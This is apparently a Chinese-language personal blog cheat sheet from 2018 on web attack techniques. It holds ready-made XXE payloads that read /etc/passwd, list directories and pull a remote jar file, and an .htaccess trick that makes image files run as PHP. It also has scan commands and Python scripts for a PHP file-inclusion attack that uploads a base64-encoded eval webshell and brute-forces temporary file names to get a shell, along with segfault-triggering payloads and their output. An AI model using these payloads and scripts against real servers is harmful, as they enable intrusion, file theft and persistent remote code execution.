---
title: web安全备忘录
abbrlink: 16486
date: 2018-06-30 19:29:10
tags: web安全
---

## dumpfile和outfile的区别

SELECT into outfile: 导出到一个txt文件，可以导出每行记录的，这个很适合导库

SELECT into dump: 只能导出一行数据

如果想把一个可执行二进制文件用into outfile函数导出，导出后，文件会被破坏

因为into outfile函数会在行末端写新行，更致使的是会转义换行符，这样2进制可执行文件就会被破坏

这时，我们能用into dumpfile导出一个完整能执行的2进制文件，它不对任何列或行进行终止，也不执行任何转义处理

总结：

into outfile:导出内容

into dumpfile:导出二进制文件

## .htaccess

```
AddType application/x-httpd-php .png
php_flag engine 1
```

php_flag 打开或者关闭PHP解析，本指令仅在使用PHP的Apache模块版本时才有用，可以基于目录或者虚拟主机来打开或者关闭PHP，将engine off放到httpd.conf文件中适当的位置就可以激活或者禁用PHP。

## XXE payload

```
<?xml version="1.0"?>
<data xmlns:xi="http://wwww.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text">
</xi:include>
</data>
```

## java XXE特殊payload：

参考: https://www.anquanke.com/post/id/164818

java 支持一个 netdoc 协议，能完成列目录的功能。

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "netdoc:///var/www/html/" >]>
<creds>
<user>&xxe;</user>
</creds>
```

java 的 jar:// 协议，通过这个协议我们能向远程服务器去请求文件（没错是一个远程的文件，这相比于 php 的 phar 只能请求本地文件来说要强大的多），并且在传输过程中会生成一个临时文件在某个临时目录中.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "jar:http://ip:port/jar.zip!/1.php" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```

## nikto信息搜集

```
nikto -h [url]
```

## dirb扫目录

```
dirb [url]
或者指定字典:
dirb [url] [字典_path]
```

## apache解析

1. `.php.xxx `，由于xxx不是正确的后缀，所以apache会向前寻找，找到php就解析
2. `.php%0a`，也行

## 上传问题:

参考链接：

* https://www.anquanke.com/post/id/164561

## PHP序列化总结

* http://www.91ri.org/15925.html

## PHP文件包含

#### LFI via SegmentFault

LFI的同时，上传文件，通过某些问题触发PHP SegmentFault,从而使得PHP临时文件不被删除，然后爆破文件名，getshell.

![](/assets/web/20180320073457-22703748-2bce-1.jpg)

经测试: php7.0可用，php7.1可用，php7.2不可用。

```
ht@TIANJI:/mnt/c/Users/HT$ php -v
PHP 7.0.30-0ubuntu0.16.04.1 (cli) ( NTS )
Copyright (c) 1997-2017 The PHP Group
Zend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies
    with Zend OPcache v7.0.30-0ubuntu0.16.04.1, Copyright (c) 1999-2017, by Zend Technologies
ht@TIANJI:/mnt/c/Users/HT$ php -r 'print_r(file_get_contents("php://filter/string.strip_tags/resource=/etc/passwd"));'
Segmentation fault (core dumped)


tiandiwuji@tiandiwuji:~$ php -v
PHP 7.2.10-0ubuntu0.18.04.1 (cli) (built: Sep 13 2018 13:45:02) ( NTS )
Copyright (c) 1997-2018 The PHP Group
Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies
    with Zend OPcache v7.2.10-0ubuntu0.18.04.1, Copyright (c) 1999-2018, by Zend Technologies
tiandiwuji@tiandiwuji:~$ php -r 'print_r(file_get_contents("php://filter/string.strip_tags/resource=/etc/passwd"));'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```

脚本，上传多个文件:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string
import itertools

charset = string.digits + string.letters

host = "192.168.43.155"
port = 80
base_url = "http://%s:%d" % (host, port)


def upload_file_to_include(url, file_content):
    files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
    try:
        response = requests.post(url, files=files)
    except Exception as e:
        print e


def generate_tmp_files():
    webshell_content = '<?php eval($_REQUEST[c]);?>'.encode(
        "base64").strip().encode("base64").strip().encode("base64").strip()
    file_content = '<?php if(file_put_contents("/tmp/ssh_session_HD89q2", base64_decode("%s"))){echo "flag";}?>' % (
        webshell_content)
    phpinfo_url = "%s/include.php?f=php://filter/string.strip_tags/resource=/etc/passwd" % (
        base_url)
    length = 6
    times = len(charset) ** (length / 2)
    for i in xrange(times):
        print "[+] %d / %d" % (i, times)
        upload_file_to_include(phpinfo_url, file_content)


def main():
    generate_tmp_files()


if __name__ == "__main__":
    main()
```

爆破文件名:

```
import string
import itertools

charset = string.digits + string.letters
filenames = itertools.product(charset,repeat=6)
for i in filenames:
    filename = "".join(i)
    print filename
```

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

charset = string.digits + string.letters

host = "192.168.43.155"
port = 80
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/include.php?f=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'flag' in response.content:
                                    print "[+] Include success!"
                                    return True
                            except Exception as e:
                                print e
    return False

def main():
    brute_force_tmp_files()

if __name__ == "__main__":
    main()
```

payload: php7.* 可用

原理需要自己调试一下: https://hackmd.io/s/Hk-2nUb3Q

```
<?php
file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));
?>
```

```
php7.0,php7.1,php7.2,php7.3均可用。
tiandiwuji@tiandiwuji:~$ php -r "file(urldecode('php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAFAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA'));"
Segmentation fault (core dumped)
```

## base64decode

实际解码过程:

```
<?php
$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
base64_decode($_GET['txt']);
```



